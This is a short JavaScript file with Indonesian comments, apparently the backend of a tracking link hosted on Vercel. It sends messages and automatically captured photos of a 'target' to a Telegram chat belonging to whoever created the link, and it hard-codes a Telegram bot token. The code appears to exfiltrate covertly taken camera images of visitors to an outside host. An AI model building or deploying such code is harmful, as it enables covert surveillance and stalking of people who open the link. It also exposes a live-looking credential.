// script.js (Upload ke Vercel)
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('ref'); // ID Admin yang membuat link
const botToken = "8556917932:AAG6ZjgdxqrMl74xBiZmw4Ol5MuIlrlSGSg"; // Harus sama dengan di bot

async function sendToTelegram(message) {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: chatId, 
            text: message, 
            parse_mode: "Markdown" 
        })
    });
}

// Fungsi kirim foto otomatis
async function sendPhotoToTelegram(base64Data) {
    const blob = await (await fetch(base64Data)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', '📸 **TARGET TERDETEKSI!**');

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}